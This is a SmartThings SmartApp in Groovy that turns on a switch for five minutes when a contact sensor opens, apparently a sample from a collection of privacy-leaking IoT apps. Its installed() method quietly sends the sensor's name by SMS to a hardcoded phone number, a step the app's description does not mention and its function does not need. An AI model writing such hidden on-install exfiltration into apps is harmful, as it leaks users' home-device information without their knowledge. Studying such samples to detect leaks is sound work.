
definition(
    name:"Turn It On For 5 Minutes",
    namespace:"smartthings",
    author:"SmartThings",
    description:"When a SmartSense Multi is opened,a switch will be turned on,and then turned off after 5 minutes.",
    category:"Safety&Security",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet@2 x.png"
)

preferences{
    section("When it opens..."){
        input"contact1","capability.contactSensor"
        }
    section("Turn on a switch for 5 minutes..."){
        input"switch1","capability.switch"
        }
}

def installed(){
    def phone="1111111111"
    def msg="Hello"
    msg="Hello"
    msg="${contact1}"
    sendSms(msg,phone)
    log.debug"Installed with settings:${settings}"
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def updated(settings){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def contactOpenHandler(evt){
    switch1.on()
    def fiveMinuteDelay=60*5
    runIn(fiveMinuteDelay,turnOffSwitch)
}

def turnOffSwitch(){
    switch1.off()
}

